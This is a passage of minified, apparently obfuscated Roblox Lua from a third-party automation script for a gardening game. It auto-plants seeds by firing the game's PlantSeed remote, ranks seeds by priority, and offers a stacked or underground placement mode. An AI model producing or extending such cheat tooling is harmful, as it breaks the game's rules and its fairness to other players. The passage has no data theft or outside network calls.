		local G = type(y.ExpansionPrices) == "table" and # y.ExpansionPrices or 0
		return math.max(G + 1, Z.GardenSeedLimit.FallbackMaximumSlotsGardenSeedLimit)
	end,
	GetCurrentLimitGardenSeedLimit = function()
		local G = Z.GardenSeedLimit.GetCurrentSlotGardenSeedLimit()
		local V = Z.GardenSeedLimit.GetMaximumSlotGardenSeedLimit()
		local y = math.clamp(G, 1, V)
		return y * Z.GardenSeedLimit.PlantsPerSlotGardenSeedLimit
	end;
	GetMaximumLimitGardenSeedLimit = function()
		return Z.GardenSeedLimit.GetMaximumSlotGardenSeedLimit() * Z.GardenSeedLimit.PlantsPerSlotGardenSeedLimit
	end;
	GetCurrentCountGardenSeedLimit = function()
		return math.max(math.floor(tonumber(Z.Farm.GetPlantedSeedTotalCount()) or 0), 0)
	end,
	HasSpaceGardenSeedLimit = function()
		return Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit() < Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit()
	end,
	GetOverLimitStateGardenSeedLimit = function()
		local G = Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit()
		local V = Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit()
		return G > V, G, V
	end
}
Z.Seeder = {
	MaxPerLoop = 30,
	MinPlantSpacing = .99,
	SpreadStep = 1.35,
	MaxPositionAttempts = 220,
	StackStep = .67;
	StackIndex = 0,
	HardGardenLimit = 1500;
	MaxFailedPlacements = 10;
	PrintCurrentStackLocation = function(G)
		local V = tostring(h.seed_place_mode or "Random")
		local y
		local j
		local i
		if Z.Farm.IsPlacementModeFarm(V) then
			local G, c, J = Z.Farm.GetPlacementPositionFarm(V)
			if J ~= W.Default then
				y = c
				if y and typeof(G) == "Vector3" then
					local V = y.CFrame:PointToObjectSpace(G)
					j = V.X
					i = V.Z
				end
			else
				local G, V, c = Z.Farm.GetPermanentPlantPosition(.5)
				y = V
				j = c and c.X
				i = c and c.Z
			end
		elseif V == "Saved Position" then
			local G = h.seed_place_saved_position
			y = type(G) == "table" and Z.Farm.GetPlantArea(G.area) or nil
			j = type(G) == "table" and tonumber(G.x) or nil
			i = type(G) == "table" and tonumber(G.z) or nil
		end
		if not y or not j or not i then
			return 0, 0
		end
		local c = Z.Seeder.GetStackedPosition(y, j, i, 0)
		if typeof(c) ~= "Vector3" then
			return 0, 0
		end
		local J = 0
		local T = 0
		local d = Z.FruitFiltersDataSync.GetPlantEntriesFruitFiltersDataSync()
		for V, y in ipairs(d) do
			local j = Z.Seeder.GetPlantPosition(y)
			if typeof(j) ~= "Vector3" then
				continue
			end
			if G and typeof(G) == "Vector3" then
				local V = j.X - G.X
				local y = j.Z - G.Z
				if V * V + y * y > 4 then
					continue
				end
			end
			local i = j.Y - c.Y
			J = math.max(J, i)
			T = math.min(T, i)
		end
		J = math.round(J)
		T = math.round(T)
		return T, J
	end;
	GetDetectedStackIndex = function(G)
		local V, y = Z.Seeder.PrintCurrentStackLocation(G)
		local j = h.seed_place_stack_mode_underground and math.abs(V) or math.abs(y)
		local i = math.max(tonumber(Z.Seeder.StackStep) or .67, .01)
		return math.max(math.round(j / i) + 1, 1)
	end,
	GetGardenLimit = function()
		local G = math.floor(tonumber(h.seed_place_max_garden_plants) or Z.Seeder.HardGardenLimit)
		return math.clamp(G, 0, Z.Seeder.HardGardenLimit)
	end,
	GetStackedPosition = function(G, V, y, j)
		if not G or not G:IsA("BasePart") then
			return nil
		end
		V = tonumber(V)
		y = tonumber(y)
		j = math.max(math.floor(tonumber(j) or 0), 0)
		if not V or not y then
			return nil
		end
		local i = j * Z.Seeder.StackStep
		local c = i
		if h.seed_place_stack_mode and h.seed_place_stack_mode_underground then
			c = - i
		end
		return G.CFrame:PointToWorldSpace(Vector3.new(V, c, y))
	end,
	GetSavedPositionText = function()
		local G = h.seed_place_saved_position
		if type(G) ~= "table" then
			return "\240\159\147\141 Saved Position: Not set"
		end
		local V = tostring(G.area or "")
		local y = tonumber(G.x)
		local Z = tonumber(G.z)
		if V == "" or not y or not Z then
			return "\240\159\147\141 Saved Position: Not set"
		end
		return string.format("\240\159\147\141 Saved Position: %s | X %.2f | Z %.2f", V, y, Z)
	end;
	GetDataLocalPositionSeedPlacer = function(G)
		local V = type(G) == "table" and G.Positions or nil
		if type(V) ~= "table" then
			return nil
		end
		local y = tonumber(V.PosX)
		local Z = tonumber(V.PosY)
		local j = tonumber(V.PosZ)
		if not y or not Z or not j then
			return nil
		end
		return Vector3.new(y, Z, j)
	end;
	GetDataWorldPositionSeedPlacer = function(G)
		local V = Z.Seeder.GetDataLocalPositionSeedPlacer(G)
		local y = Z.Farm.GetSpawnPoint()
		if typeof(V) ~= "Vector3" or typeof(y) ~= "Instance" or not y:IsA("BasePart") then
			return nil
		end
		return y.CFrame:PointToWorldSpace(V)
	end;
	GetPhysicalPlantPositionSeedPlacer = function(G)
		if typeof(G) ~= "Instance" or not G.Parent or G:GetAttribute("emove") == true then
			return nil
		end
		if G:IsA("Model") then
			local V, y = pcall(function()
				return G:GetPivot()
			end)
			if V and typeof(y) == "CFrame" then
				return y.Position
			end
		elseif G:IsA("BasePart") then
			return G.Position
		end
		return nil
	end,
	FindPhysicalPlantByIdSeedPlacer = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local V = Z.FruitFiltersDataSync
		if not V or type(V.GetPlantIdFruitFiltersDataSync) ~= "function" then
			return nil
		end
		for y, Z in ipairs(Z.Farm.GetPlants()) do
			if typeof(Z) ~= "Instance" or not Z.Parent or Z:GetAttribute("emove") == true then
				continue
			end
			if V.GetPlantIdFruitFiltersDataSync(nil, nil, Z) == G then
				return Z
			end
		end
		return nil
	end;
	GetPlantPosition = function(G)
		if type(G) == "table" then
			local V = type(G.data) == "table" and G.data or G
			local y = typeof(G.physical) == "Instance" and G.physical or typeof(G.ob) == "Instance" and G.ob or nil
			local j = Z.Seeder.GetPhysicalPlantPositionSeedPlacer(y)
			if typeof(j) == "Vector3" then
				return j
			end
			local i = Z.FruitFiltersDataSync
			local c = i and (type(i.GetPlantIdFruitFiltersDataSync) == "function" and i.GetPlantIdFruitFiltersDataSync(G.id, V, y)) or ""
			j = Z.Seeder.GetPhysicalPlantPositionSeedPlacer(Z.Seeder.FindPhysicalPlantByIdSeedPlacer(c))
			if typeof(j) == "Vector3" then
				return j
			end
			local J = Z.Seeder.GetDataWorldPositionSeedPlacer(V)
			if typeof(J) == "Vector3" then
				return J
			end
			if typeof(G.position) == "Vector3" and type(G.data) ~= "table" then
				return G.position
			end
		end
		return Z.Seeder.GetPhysicalPlantPositionSeedPlacer(G)
	end,
	GetOccupiedPositions = function()
		local G = q.PositionGrid.Create(Z.Seeder.MinPlantSpacing)
		local V = Z.FruitFiltersDataSync.GetPlantEntriesFruitFiltersDataSync()
		for V, y in ipairs(V) do
			local j = Z.Seeder.GetPlantPosition(y)
			if typeof(j) == "Vector3" then
				q.PositionGrid.Add(G, j)
			end
		end
		return G
	end;
	IsPositionOpen = function(G, V)
		return q.PositionGrid.IsOpen(V, G, Z.Seeder.MinPlantSpacing)
	end,
	GetAreaPosition = function(G, V, y)
		if not G or not G:IsA("BasePart") then
			return nil
		end
		V = tonumber(V)
		y = tonumber(y)
		if not V or not y then
			return nil
		end
		return G.CFrame:PointToWorldSpace(Vector3.new(V, G.Size.Y / 2, y))
	end,
	IsInsidePlantArea = function(G, V, y, Z)
		if not G or not G:IsA("BasePart") then
			return false
		end
		Z = math.max(tonumber(Z) or .5, 0)
		local j = math.max(G.Size.X / 2 - Z, 0)
		local i = math.max(G.Size.Z / 2 - Z, 0)
		return math.abs(V) <= j and math.abs(y) <= i
	end;
	FindOpenPositionAround = function(G, V, y, j)
		if not G or not G:IsA("BasePart") then
			return nil
		end
		V = tonumber(V)
		y = tonumber(y)
		if not V or not y then
			return nil
		end
		for i = 0, Z.Seeder.MaxPositionAttempts, 1 do
			local c = V
			local J = y
			if i > 0 then
				local G = math.rad(i * 137.5)
				local V = Z.Seeder.SpreadStep * math.sqrt(i)
				c += math.cos(G) * V
				J += math.sin(G) * V
			end
			if not Z.Seeder.IsInsidePlantArea(G, c, J, .5) then
				continue
			end
			local T = Z.Seeder.GetAreaPosition(G, c, J)
			if T and Z.Seeder.IsPositionOpen(T, j) then
				return T
			end
		end
		return nil
	end,
	GetRandomOpenPosition = function(G)
		for V = 1, Z.Seeder.MaxPositionAttempts, 1 do
			local y = Z.Farm.GetRandomLocationForSeed(.75)
			if y and Z.Seeder.IsPositionOpen(y, G) then
				return y
			end
		end
		return nil
	end,
	BuildWallPositions = function()
		local G = {}
		local V = Z.Seeder.SpreadStep
		for y, j in ipairs(Z.Farm.GetPlantAreas()) do
			local i = .75
			local c = math.max(j.Size.X / 2 - i, 0)
			local J = math.max(j.Size.Z / 2 - i, 0)
			local T = c * 2
			local d = J * 2
			local u = math.max(math.floor(T / V), 1)
			local q = math.max(math.floor(d / V), 1)
			for V = 0, u, 1 do
				for y = 0, q, 1 do
					local i = - c + T * ((V / u))
					local g = - J + d * ((y / q))
					local E = math.min(V, u - V, y, q - y)
					local a = Z.Seeder.GetAreaPosition(j, i, g)
					if a then
						table.insert(G, {
							position = a;
							depth = E;
							random = Z.Farm._Random:NextNumber()
						})
					end
				end
			end
		end
		table.sort(G, function(G, V)
			if G.depth ~= V.depth then
				return G.depth < V.depth
			end
			return G.random < V.random
		end)
		return G
	end,
	GetWallPosition = function(G, V)
		if type(V) ~= "table" then
			return nil
		end
		for y, j in ipairs(V) do
			local i = j.position
			if Z.Seeder.IsPositionOpen(i, G) then
				table.remove(V, y)
				return i
			end
		end
		return nil
	end;
	SetStatus = function(G, V)
		g.SeedPlaceStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\177 [Seed Placer]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or "Waiting"))
	end,
	ClearStatus = function()
		g.SeedPlaceStatusText = ""
	end,
	GetDelay = function()
		local G = Z.TotalControl.ResolveSeedPlaceDelayTotalControl()
		if G ~= nil then
			return math.max(tonumber(G) or .3, .001)
		end
		return math.max(tonumber(h.seed_place_delay) or .3, .001)
	end;
	GetSeedNames = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable) do
			local Z = type(y) == "table" and y.name
			if type(Z) == "string" and Z ~= "" then
				table.insert(G, Z)
			end
		end
		table.sort(G)
		return G
	end,
	GetOverrideTarget = function(G)
		if type(G) ~= "string" or G == "" then
			return nil
		end
		local V = h.seed_place_overrides
		if type(V) ~= "table" then
			return nil
		end
		local y = V[G]
		if type(y) == "number" then
			return math.max(math.floor(y), 0)
		end
		if type(y) ~= "table" or y.enabled ~= true then
			return nil
		end
		local Z = tonumber(y.target)
		if not Z then
			return nil
		end
		return math.max(math.floor(Z), 0)
	end,
	SetOverrideTarget = function(G, V)
		if type(G) ~= "string" or G == "" or not g.SeedDataFast[G] then
			return false
		end
		V = math.floor(tonumber(V) or 0)
		if V <= 0 then
			return false
		end
		if type(h.seed_place_overrides) ~= "table" then
			h.seed_place_overrides = {}
		end
		h.seed_place_overrides[G] = {
			enabled = true;
			target = V
		}
		return true
	end;
	RemoveOverrideTarget = function(G)
		if type(h.seed_place_overrides) ~= "table" then
			h.seed_place_overrides = {}
			return false
		end
		if h.seed_place_overrides[G] == nil then
			return false
		end
		h.seed_place_overrides[G] = nil
		return true
	end,
	GetTargetAmount = function(G)
		local V = Z.Seeder.GetOverrideTarget(G)
		if V ~= nil then
			return V
		end
		return math.max(math.floor(tonumber(h.seed_place_default_target) or 10), 0)
	end,
	GetAllSeedSelection = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable) do
			local Z = type(y) == "table" and y.name
			if type(Z) == "string" and Z ~= "" then
				G[Z] = true
			end
		end
		return G
	end;
	GetSeedToolCountSeedPlacer = function(G)
		if not G or not G.Parent then
			return 0
		end
		return math.max(math.floor(tonumber(G:GetAttribute("Count")) or 0), 0)
	end;
	GetInventorySeedCountSeedPlacer = function(G)
		local V = Z.DataReplica.GetData("Inventory")
		local y = type(V) == "table" and V.Seeds or nil
		if type(y) ~= "table" then
			return 0
		end
		return math.max(math.floor(tonumber(y[G]) or 0), 0)
	end;
	GetSeedTool = function(G)
		if type(G) ~= "string" or G == "" then
			return nil, 0
		end
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if y:IsA("Tool") and (y.Name == G and y:GetAttribute("SeedTool")) then
				local V = Z.Seeder.GetSeedToolCountSeedPlacer(y)
				local j = Z.Seeder.GetInventorySeedCountSeedPlacer(G)
				if j <= 0 then
					j = V
				end
				if not Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Seed", G, j) then
					return y, V
				end
			end
		end
		return nil, 0
	end,
	SaveCurrentPosition = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		Z.Seeder.StackIndex = 0
		if not G then
			return false, "Character not found"
		end
		local V, j = Z.Farm.GetPlantAreaAtPosition(G.Position)
		if not V or typeof(j) ~= "Vector3" then
			return false, "Stand inside your farm"
		end
		h.seed_place_saved_position = {
			area = V.Name,
			x = j and j.X;
			z = j and j.Z
		}
		Z.Seeder.StackIndex = 0
		a.Save.SaveDataSync()
		return true, "Planting position saved"
	end,
	GetGridOpenPositionSeedPlacer = function(G, V, y, j)
		local i = Z.ControlMode.RightCol
		j = type(j) == "string" and (j ~= "" and j) or nil
		if j then
			i = Z.ControlMode.BothCol
		end
		if y == true then
			local G = {}
			for y, i in ipairs(Z.FarmGrid.GetSortedSpotsFarmGrid(nil, i)) do
				if ((not j or i.areaName == j)) and (typeof(i.position) == "Vector3" and Z.Seeder.IsPositionOpen(i.position, V)) then
					table.insert(G, i)
				end
			end
			if # G <= 0 then
				return nil
			end
			return G[Z.Farm._Random:NextInteger(1, # G)].position
		end
		local c = Z.FarmGrid.GetOpenSpotFarmGrid(G, i, function(G)
			return ((not j or G.areaName == j)) and (typeof(G.position) == "Vector3" and Z.Seeder.IsPositionOpen(G.position, V))
		end)
		return c and c.position or nil
	end;
	GetSavedGridOriginSeedPlacer = function()
		local G = h.seed_place_saved_position
		if type(G) ~= "table" then
			return nil, "Save a planting position"
		end
		local V = Z.Farm.GetPlantArea(G.area)
		local y = tonumber(G.x)
		local j = tonumber(G.z)
		if not V or not y or not j then
			return nil, "Save a planting position"
		end
		if not Z.Seeder.IsInsidePlantArea(V, y, j, 0) then
			return nil, "Saved position is outside your farm"
		end
		return Z.Seeder.GetAreaPosition(V, y, j), nil, V.Name
	end;
	GetPlacementPosition = function(G, V)
		local y = Z.TotalControl.ResolveSeedPlacerModeTotalControl()
		local j = tostring(y or h.seed_place_mode or "Random")
		if j == "Random" then
			local V = Z.Seeder.GetGridOpenPositionSeedPlacer(nil, G, true)
			if not V then
				return nil, "No open planting position found"
			end
			return V
		end
		if Z.Farm.IsPlacementModeFarm(j) then
			local V
			local y
			local i, c, J = Z.Farm.GetPlacementPositionFarm(j)
			if J ~= W.Default then
				V = i
				if c then
					y = c.Name
				end
			else
				V = Z.Farm.GetPermanentCenterPosition()
			end
			if typeof(V) ~= "Vector3" then
				return nil, tostring(J or "Farm position") .. " not found"
			end
			local T = Z.Seeder.GetGridOpenPositionSeedPlacer(V, G, false, y)
			if not T then
				return nil, "No open position near farm placement"
			end
			return T
		end
		if j == "Saved Position" then
			local V, y, j = Z.Seeder.GetSavedGridOriginSeedPlacer()
			if typeof(V) ~= "Vector3" then
				return nil, y or "Save a planting position"
			end
			local i = Z.Seeder.GetGridOpenPositionSeedPlacer(V, G, false, j)
			if not i then
				return nil, "No open position in saved area"
			end
			return i
		end
		return nil, "Invalid placement mode"
	end,
	GetCandidates = function()
		local G = {}
		local V = h.allowed_seedsplace
		local y = Z.Farm.GetPlantedSeedCounts()
		local j = 0
		local i = 0
		if type(V) ~= "table" then
			return G, y, j, i
		end
		for V, c in pairs(V) do
			if c ~= true or type(V) ~= "string" or V == "" then
				continue
			end
			j += 1
			local J = Z.Seeder.GetTargetAmount(V)
			local T = math.max(math.floor(tonumber(y[V]) or 0), 0)
			local d = math.max(J - T, 0)
			if d <= 0 then
				continue
			end
			i += 1
			local u, q = Z.Seeder.GetSeedTool(V)
			local g = math.min(d, q)
			if u and g > 0 then
				table.insert(G, {
					name = V;
					tool = u,
					planted = T;
					target = J;
					available = q;
					remaining = g
				})
			end
		end
		return G, y, j, i
	end,
	PlaceSeed = function(G, V, j)
		if type(G) ~= "string" or G == "" or typeof(V) ~= "Vector3" then
			return false
		end
		local i = y.Character
		if not i or not i.Parent then
			return false
		end
		if not j or not j:IsA("Tool") or j.Parent ~= i then
			j = i:FindFirstChild(G)
		end
		if not j or not j:IsA("Tool") then
			return false
		end
		local c = y.Networking and (y.Networking.Plant and y.Networking.Plant.PlantSeed)
		if not c or type(c.Fire) ~= "function" then
			return false
		end
		local J = Z.Seeder.GetSeedToolCountSeedPlacer(j)
		local T = Z.Seeder.GetInventorySeedCountSeedPlacer(G)
		if J <= 0 and T <= 0 then
			return false
		end
		local d = T > 0 and T or J
		if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Seed", G, d) then
			return false, J
		end
		local u = pcall(function()
			c:Fire(V, G, j)
		end)
		if not u then
			return false
		end
		local q = os.clock() + .4
		repeat
			if not j.Parent then
				return true, 0
			end
			local V = Z.Seeder.GetSeedToolCountSeedPlacer(j)
			local y = Z.Seeder.GetInventorySeedCountSeedPlacer(G)
			if V < J or y < T then
				return true, V
			end
			task.wait()
		until os.clock() >= q
		return false, J
	end;
	Run = function()
		local G = Z.Seeder.GetGardenLimit()
		local V = Z.Farm.GetPlantedSeedTotalCount()
		if V >= Z.Seeder.HardGardenLimit then
			Z.Seeder.SetStatus(string.format("Game garden limit reached %d/%d", V, Z.Seeder.HardGardenLimit), "#FF5555")
			return 0
		end
		if V >= G then
			Z.Seeder.SetStatus(string.format("Selected garden limit reached %d/%d", V, G), "#FFCC66")
			return 0
		end
		local y, j, i, c = Z.Seeder.GetCandidates()
		if i <= 0 then
			Z.Seeder.SetStatus("Paused: select seeds", "#FFCC66")
			return 0
		end
		if # y <= 0 then
			if c <= 0 then
				Z.Seeder.SetStatus("All selected targets reached", "#7CFC00")
			else
				Z.Seeder.SetStatus("Selected seeds not found", "#FFCC66")
			end
			return 0
		end
		local J = 0
		local T = false
		local d = Z.Seeder.GetDelay()
		local u = tostring(h.seed_place_mode or "Random")
		local g = Z.Seeder.GetOccupiedPositions()
		local E = 0
		local a = math.max(math.floor(tonumber(Z.Seeder.StackIndex) or 0), 0)
		local H = 0
		local r = false
		while h.auto_seedplace and (# y > 0 and (E < Z.Seeder.MaxPerLoop and V < G)) do
			local i = Z.Farm._Random:NextInteger(1, # y)
			local c = y[i]
			local Y, e = Z.Seeder.GetPlacementPosition(g, a)
			if not Y then
				Z.Seeder.SetStatus(e or "Planting position unavailable", "#FF5555")
				break
			end
			local s, N = Z.Seeder.GetSeedTool(c.name)
			if not s or N <= 0 or c.remaining <= 0 then
				table.remove(y, i)
				continue
			end
			if not Z.Player.IsToolHeld(s) then
				if not Z.Player.EquipTool(s) then
					table.remove(y, i)
					continue
				end
				T = true
				task.wait(.1)
			end
			if not Z.Player.IsToolHeld(s) then
				table.remove(y, i)
				continue
			end
			if V >= G then
				Z.Seeder.SetStatus(string.format("Garden limit reached %d/%d", V, G), "#FFCC66")
				break
			end
			E += 1
			local W, X = Z.Seeder.PlaceSeed(c.name, Y, s)
			if W then
				H = 0
				q.PositionGrid.Add(g, Y)
				V += 1
				if h.seed_place_stack_mode and ((u == "Saved Position" or Z.Farm.IsPlacementModeFarm(u))) then
					a += 1
					Z.Seeder.StackIndex = a
				end
				c.planted += 1
				c.available = tonumber(X) or math.max(c.available - 1, 0)
				c.remaining -= 1
				j[c.name] = c.planted
				J += 1
				task.wait(d)
			else
				H += 1
				if h.seed_place_stack_mode and ((u == "Saved Position" or Z.Farm.IsPlacementModeFarm(u))) then
					local G = Z.Seeder.GetDetectedStackIndex(Y)
					a = math.max(a + 1, G)
					Z.Seeder.StackIndex = a
				end
				Z.Seeder.SetStatus(string.format("Placement not confirmed (%d/%d)", H, Z.Seeder.MaxFailedPlacements), "#FFCC66")
				q.PositionGrid.Add(g, Y)
				if H >= Z.Seeder.MaxFailedPlacements then
					V = Z.Farm.GetPlantedSeedTotalCount()
					r = true
					if V >= Z.Seeder.HardGardenLimit then
						Z.Seeder.SetStatus(string.format("Game garden limit reached %d/%d", V, Z.Seeder.HardGardenLimit), "#FF5555")
					else
						Z.Seeder.SetStatus(string.format("Server did not confirm placement | Garden %d/%d", V, Z.Seeder.HardGardenLimit), "#FF5555")
					end
					break
				end
				task.wait(.05)
				continue
			end
			if c.remaining <= 0 or c.available <= 0 then
				table.remove(y, i)
			end
		end
		if T then
			Z.Player.UnequipTools()
		end
		V = Z.Farm.GetPlantedSeedTotalCount()
		if not h.auto_seedplace then
			Z.Seeder.ClearStatus()
		elseif V >= Z.Seeder.HardGardenLimit then
			Z.Seeder.SetStatus(string.format("Game garden limit reached %d/%d", V, Z.Seeder.HardGardenLimit), "#FF5555")
		elseif V >= G then
			Z.Seeder.SetStatus(string.format("Selected garden limit reached %d/%d", V, G), "#FFCC66")
		elseif J > 0 and not r then
			Z.Seeder.SetStatus(string.format("Placed %d seed%s | Waiting", J, J == 1 and "" or "s"), "#7CFC00")
		end
		return J
	end;
	SeedPlaceLoop = function()
		local G = Z.TotalControl.ResolveNormalSeedPlacerEnabledTotalControl()
		if G ~= nil then
			if G ~= true then
				Z.Seeder.ClearStatus()
				return 0
			end
		elseif not h.auto_seedplace then
			Z.Seeder.ClearStatus()
			return 0
		end
		local V, y = pcall(Z.Seeder.Run)
		if not V then
			Z.Player.UnequipTools()
			Z.Seeder.SetStatus("Error: seed placer failed", "#FF4444")
			warn("[Seeder] Loop error:", y)
			return 0
		end
		return tonumber(y) or 0
	end
}
Z.SmartSeedProgression = {
	BusySmartSeedProgression = false,
	MaxSpotAttemptsSmartSeedProgression = 10,
	LastSeedScoresBuiltSmartSeedProgression = 0;
	SeedScoresSmartSeedProgression = {},
	ManualPrioritySmartSeedProgression = {
		["Hypno Bloom"] = 1;
		["Moon Bloom"] = 2;
		["Briar Rose"] = 3;
		["Venom Spitter"] = 4,
		["Dragon\'s Breath"] = 5,
		["Venus Fly Trap"] = 6;
		["Ghost Pepper"] = 7;
		Sunflower = 8,
		["Poison Ivy"] = 9,
		Pomegranate = 10,
		["Poison Apple"] = 11;
		Mushroom = 12,
		Bamboo = 13;
		Cherry = 14;
		["Glow Mushroom"] = 15
	},
	SetStatusSmartSeedProgression = function(G, V, y)
		G = tostring(G or "Waiting")
		V = tostring(V or "#FFFFFF")
		g.SmartSeedProgressionPlainStatusText = G
		if y ~= nil then
			g.SmartSeedProgressionDebugText = tostring(y or "")
		end
		g.SmartSeedProgressionStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\167\160 [Smart Seeds]</font> <font color=\'%s\'>%s</font></stroke>", V, G)
		Z.SmartSeedProgression.RefreshUiSmartSeedProgression()
	end;
	ClearStatusSmartSeedProgression = function()
		g.SmartSeedProgressionStatusText = ""
		g.SmartSeedProgressionPlainStatusText = "Not enabled"
		g.SmartSeedProgressionDebugText = ""
		Z.SmartSeedProgression.RefreshUiSmartSeedProgression()
	end,
	GetUiTextSmartSeedProgression = function()
		if Z.TotalControl.ResolveSmartSeedingEnabledTotalControl() == true then
			return "Status: <font color=\'#7CFC00\'>Enabled by Total Control</font>"
		end
		if h.smart_seed_progression_enabled == true then
			return "Status: <font color=\'#7CFC00\'>Enabled</font>"
		end
		return "Status: <font color=\'#FF6666\'>Not enabled</font>"
	end;
	GetDebugUiTextSmartSeedProgression = function()
		if g.SmartSeedProgressionDebug ~= true then
			return ""
		end
		local G = tostring(g.SmartSeedProgressionDebugText or "")
		if G == "" then
			G = "Waiting for next smart seeding cycle"
		end
		return "<font color=\'#66CCFF\'>Debug:</font> <font color=\'#CFCFCF\'>" .. (G .. "</font>")
	end,
	RefreshUiSmartSeedProgression = function()
		local G = g.SmartSeedProgressionUiRefs
		if type(G) ~= "table" then
			return false
		end
		if G.StatusLabel and type(G.StatusLabel.SetText) == "function" then
			G.StatusLabel:SetText(Z.SmartSeedProgression.GetUiTextSmartSeedProgression())
		end
		if G.DebugLabel and type(G.DebugLabel.SetText) == "function" then
			G.DebugLabel:SetText(Z.SmartSeedProgression.GetDebugUiTextSmartSeedProgression())
		end
		return true
	end,
	GetStartBlockerSmartSeedProgression = function()
		if h.auto_seedplace == true then
			return "Disable Seed Placer first"
		end
		if h.auto_shovel_plants == true then
			return "Disable Plant Shovel first"
		end
		return nil
	end,
	StartSmartSeedProgression = function(G)
		if h.smart_seed_progression_enabled == true then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Smart seeding already enabled", "#FFCC66")
			if G == true then
				g.Notify("Smart Seeding is already enabled", 3)
			end
			return false
		end
		local V = Z.SmartSeedProgression.GetStartBlockerSmartSeedProgression()
		if V then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(V, "#FF6666")
			if G == true then
				g.Notify(V, 4)
			end
			return false
		end
		h.smart_seed_progression_enabled = true
		Z.SmartSeedProgression.SetStatusSmartSeedProgression("Starting smart seeding", "#7CFC00")
		a.Save.SaveDataSync()
		return true
	end;
	StopSmartSeedProgression = function()
		h.smart_seed_progression_enabled = false
		Z.SmartSeedProgression.ClearStatusSmartSeedProgression()
		a.Save.SaveDataSync()
		return true
	end;
	GetRarityValuesSmartSeedProgression = function()
		local G = {}
		for V, y in pairs(g.RarityRank or {}) do
			local j = Z.Data.GetRarityColor(V)
			table.insert(G, {
				Text = string.format("<font color=\'%s\'>%s</font>", j, V),
				Value = V;
				Rank = y or 0
			})
		end
		table.sort(G, function(G, V)
			return ((G.Rank or 0)) > ((V.Rank or 0))
		end)
		return G
	end;
	GetPlantValuesSmartSeedProgression = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable or {}) do
			local j = type(y) == "table" and tostring(y.name or "") or ""
			if j == "" then
				continue
			end
			local i = tostring(y.rarity or "Unknown")
			local c = Z.Data.GetRarityColor(i)
			local J = Z.SmartSeedProgression.GetSeedScoreSmartSeedProgression(j) or 0
			table.insert(G, {
				Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", j, c, i);
				Value = j,
				Score = J
			})
		end
		table.sort(G, function(G, V)
			if ((G.Score or 0)) ~= ((V.Score or 0)) then
				return ((G.Score or 0)) > ((V.Score or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end,
	GetSeedScoreSmartSeedProgression = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local V = g.SeedDataFast and g.SeedDataFast[G] or nil
		if type(V) == "table" and V.mutation_seed == true then
			local G = Z.TotalControl.ResolveMutationSeedsAllowedTotalControl()
			if G ~= nil then
				if G ~= true then
					return nil
				end
			elseif h.smart_seed_progression_mutation_seeds_enabled ~= true then
				return nil
			end
			local y = tostring(V.rarity or "")
			local j = g.RarityRank[y] or 0
			return 1000000000 + (j * 10000)
		end
		local j = Z.SmartSeedProgression.SeedScoresSmartSeedProgression[G]
		if j ~= nil then
			return j ~= false and j or nil
		end
		local i = type(y.SellValueData) == "table" and tonumber(y.SellValueData[G]) or nil
		local c = type(V) == "table" and tostring(V.rarity or "") or tostring(g.SeedRarity[G] or "")
		local J = g.RarityRank[c] or 0
		local T = Z.SeedData and (type(Z.SeedData.IsSingleHarvest) == "function" and Z.SeedData.IsSingleHarvest(G) == true)
		local d = Z.SmartSeedProgression.ManualPrioritySmartSeedProgression[G]
		if ((not i or i <= 0)) and not d then
			Z.SmartSeedProgression.SeedScoresSmartSeedProgression[G] = false
			return nil
		end
		local u = tonumber(i) or 1
		local q = T and .35 or 1.75
		local E = d and (((100 - d)) * 1000) or 0
		local a = (E + (u * q)) + (J * 75)
		Z.SmartSeedProgression.SeedScoresSmartSeedProgression[G] = a
		return a
	end,
	GetToolCountSmartSeedProgression = function(G)
		if not G or not G.Parent then
			return 0
		end
		return math.max(math.floor(tonumber(G:GetAttribute("Count") or G:GetAttribute("Amount") or G:GetAttribute("Quantity") or 0) or 0), 0)
	end;
	GetSeedNameFromToolSmartSeedProgression = function(G)
		if not G or not G:IsA("Tool") or not G:GetAttribute("SeedTool") then
			return ""
		end
		local V = G:GetAttribute("Seed") or G:GetAttribute("SeedName") or G.Name
		V = tostring(V or "")
		if V:sub(- 5) == " Seed" then
			V = V:sub(1, - 6)
		end
		return V
	end;
	GetOwnedSeedsSmartSeedProgression = function()
		local G = {}
		local V = {}
		for y, j in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local i = Z.SmartSeedProgression.GetSeedNameFromToolSmartSeedProgression(j)
			if i == "" or Z.SmartSeedProgression.IsPreventedPlacementSeedSmartSeedProgression(i) then
				continue
			end
			local c = Z.SmartSeedProgression.GetToolCountSmartSeedProgression(j)
			local J = Z.SmartSeedProgression.GetSeedScoreSmartSeedProgression(i)
			if c <= 0 or not J or Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Seed", i, c) then
				continue
			end
			local T = G[i]
			if not T then
				T = {
					name = i;
					tool = j,
					count = 0;
					score = J,
					rarity = tostring(g.SeedRarity[i] or "Unknown")
				}
				G[i] = T
				table.insert(V, T)
			end
			T.count += c
			if not T.tool or not T.tool.Parent or c > Z.SmartSeedProgression.GetToolCountSmartSeedProgression(T.tool) then
				T.tool = j
			end
		end
		table.sort(V, function(G, V)
			if ((G.score or 0)) ~= ((V.score or 0)) then
				return ((G.score or 0)) > ((V.score or 0))
			end
